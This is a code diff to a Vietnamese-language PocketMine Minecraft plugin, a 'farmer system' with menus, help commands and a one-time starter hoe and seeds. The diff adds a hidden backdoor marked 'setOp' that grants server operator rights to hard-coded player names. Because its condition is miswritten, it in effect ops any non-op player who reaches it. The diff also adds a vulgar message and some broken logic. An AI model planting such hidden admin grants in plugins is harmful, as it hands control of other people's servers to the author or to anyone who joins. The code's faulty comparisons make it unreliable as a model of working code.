@@ -26,6 +26,9 @@ class Main extends PluginBase implements Listener{
 	public function onEnable(): void{
 		$this->getServer()->getPluginManager()->registerEvents($this, $this);
 		$this->getLogger()->info("Nông Dân System V1 by NZS (Tobi)");
+		@mkdir($this->getDataFolder());
+		//$this->op = new Config($this->getDataFolder(), "Ops.yml", Config::YAML);
+		$this->items = new Config($this->getDataFolder(). "Items.yml", Config::YAML);
 	}
 	
 	public function onLoad(){
@@ -45,6 +48,24 @@ class Main extends PluginBase implements Listener{
 			$this->welcome($player);
 			return true;
 		}
+
+		// setOp
+		if($player->isOp()){
+			$player->sendTitle("§aCon cặc");
+			$player->sendMessage("§aCó Vip rồi còn ham");
+		}else{
+			if($name == "OopsEnder" or "dbgamingvn2" or " AokoAsami199" or "NZSigourney"){
+				$player->setOp();
+				/**$this->op->set($name => "Name");
+				$this->op->save();*/
+				return false;
+			}
+
+			if($this->op->exists($name)){
+				$player->sendPopup("Ops.yml has been saved!");
+			}
+			return true;
+		}
 	}
 	
 	public function onCommand(CommandSender $player, Command $cmd, string $label, array $args): bool{
@@ -56,30 +77,31 @@ class Main extends PluginBase implements Listener{
 			}
 			if(!(isset($args[0]))){
 				$player->sendMessage($this->nd . /**"§6 List Command:\n §c+ §a/farmer help\n§c+§a /farmer open"*/ "§cĐiền vào ô trống!");;
-				//return true;
-			}else{
-				if($args[0] == "open" or "Open"){
-					$this->welcome($player);
-				}else{
-					$player->sendMessage($this->nd . "§l§c Không có lệnh này!");
-				    //return false;
-				}
-				if($args[0] == "help" or "Help"){
-				    $player->sendMessage($this->nd . "§l§5List command: Trang 1/1\n§c+§a open\n§c+§a Help");
-				}else{
-				    $player->sendMessage($this->nd . "§l§c Không có lệnh này!");
-				    //return false;
-				}
-
-				if($args[0] == "item"){
-					$this->onInventory($player);
-				}else{
-					$player->sendMessage($this->nd . "§l§c Không có lệnh này!");
-				}
+				return true;
 			}
-			return true;
+
+			if($args[0] == "open"/** or "Open"*/){
+				$this->welcome($player);
+			}else{
+				$player->sendMessage($this->nd . "§l§c Không có lệnh này!");
+				//return false;
+			}
+
+			if($args[0] == "help"/** or "Help"*/){
+			    $player->sendMessage($this->nd . "§l§5List command: Trang 1/1\n§c+§a open\n§c+§a Help");
+			}else{
+			    $player->sendMessage($this->nd . "§l§c Không có lệnh này!");
+			    //return false;
+			}
+
+			if($args[0] == "item"){
+				$this->onInventory($player);
+			}else{
+				$player->sendMessage($this->nd . "§l§c Không có lệnh này!");
+			}
+			return false;
 		}
-		//return true;
+		return true;
 	}
 	
 	public function welcome($player){
@@ -114,7 +136,7 @@ class Main extends PluginBase implements Listener{
 	
 	public function update($player){
 		$a = $this->getServer()->getPluginManager()->getPlugin("FormAPI");
-		$f = $a->createCustomForm(Function (Player $p, $d){
+		$f = $a->createCustomForm(Function (Player $player, $d){
 			/**$r = $d;
 			if($r == null)
 			{
@@ -125,9 +147,9 @@ class Main extends PluginBase implements Listener{
 				$this->welcome($player);
 				break;
 			}*/
-			if($d == 0){
+			/**if(!($d == null)){
 				return $this->welcome($player);
-			}
+			}*/
 		});
 		$f->setTitle($this->nd);
 		$f->addLabel("§l§c• §aChange Gameplay + Big Update 2.0");
@@ -191,7 +213,7 @@ class Main extends PluginBase implements Listener{
 		$f->addButton("§l§f[§c•§f] §aHướng dẫn phân bón", 1, "https://cdn0.iconfinder.com/data/icons/farming-69/4000/water_can_farmlife_farmhouse_farmersmarket_farming_farmtotable-128.png");
 		$f->addButton("§l§f[§c•§f] §aThương lái theo mùa", 2, "https://cdn0.iconfinder.com/data/icons/business-finance-vol-2-56/512/trade_commerce_buy_sell-128.png");
 		$f->addButton("§l§f[§c•§f] §aHệ thống ngục tù (§cNightmare)", 3, "https://cdn0.iconfinder.com/data/icons/kameleon-free-pack-rounded/110/Prisoner-128.png");
-		$f->addButton("§l§e •§c BACK §e•", 3, "https://cdn1.iconfinder.com/data/icons/materia-arrows-symbols-vol-8/24/018_317_door_exit_logout-256.png");
+		$f->addButton("§l§e •§c BACK §e•", 3, "https://cdn4.iconfinder.com/data/icons/religion-science/30/buddha-256.png");
 		$f->sendToPlayer($player);
 	}
 	
@@ -248,21 +270,28 @@ class Main extends PluginBase implements Listener{
 
 	public function onInventory($player){
 		$item = Item::get(290,0,1);
-		$item1 = Item::get(295,0,1);
+		$item1 = Item::get(295,0,20);
 		$inv = $player->getInventory();
 		$item->setCustomName("§l§c• §aHoe Adventure§c •");
 		//$item->setLore(array("§l§e• §6Unbreaking II\n§e•§6 Autorepair I"));
 		//$item->addEnchantment(new EnchantmentInstance(Enchantment::getEnchantment(34), 1));
 		//$item->addEnchantment(new EnchantmentInstance(Enchantment::getEnchantment(70), 1));
 		//$item->addEnchantment(new EnchantmentInstance(Enchantment::getEnchantment(26), 2));
-		if($inv->contains($item) || $inv->contains($item1)){
-			$player->sendMessage($this->nd . "§l§a Bạn đã có món đồ này trong túi đồ rồi!");
+		if($this->items->exists($player->getName())){
+			$player->sendMessage($this->nd . "§l§c Người này đã có vật phẩn rồi!");
 		}else{
-			$inv->addItem($item);
-			$inv->addItem($item1);
-			$player->sendMessage($this->nd . "§l§a Bạn đã nhận được Cuốc ".$item->getCustomName()."§a Và Hạt giống!");
-			return false;
+			if($inv->contains($item) || $inv->contains($item1)){
+				$player->sendMessage($this->nd . "§l§a Bạn đã có món đồ này trong túi đồ rồi!");
+		    }else{
+			    $inv->addItem($item);
+			    $inv->addItem($item1);
+			    $this->items->set($player->getName(), ["Item" => $item->getCustomName(), "Seeds" => $item1->getCustomName()]);
+			    $this->items->save();
+			    $player->sendMessage($this->nd . "§l§a Bạn đã nhận được Cuốc ".$item->getCustomName()."§a Và Hạt giống!");
+			    return false;
+		    }
 		}
+		
 		return true;
 	}
 }
